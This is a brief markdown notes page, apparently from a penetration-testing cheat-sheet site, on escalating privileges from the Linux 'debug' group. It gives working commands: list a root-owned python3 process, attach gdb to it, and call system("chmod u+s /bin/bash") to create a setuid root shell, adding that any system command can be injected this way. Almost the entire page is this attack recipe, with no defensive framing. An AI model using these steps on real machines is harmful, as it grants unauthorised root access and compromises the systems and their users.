---
layout: page
subtitle: Debug group vuln
#gallery_path: "assets/img/pexels"
tags: [Page]
---

groups

mail *debug* 

for example
```
locate proceess for example :


ps aux | grep root | grep python3
root         694  0.0  0.9  26896 18208 ?        Ss   11:02   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers


gdb -p 694

call (void)system("chmod u+s /bin/bash") *we can use any other system commands

```

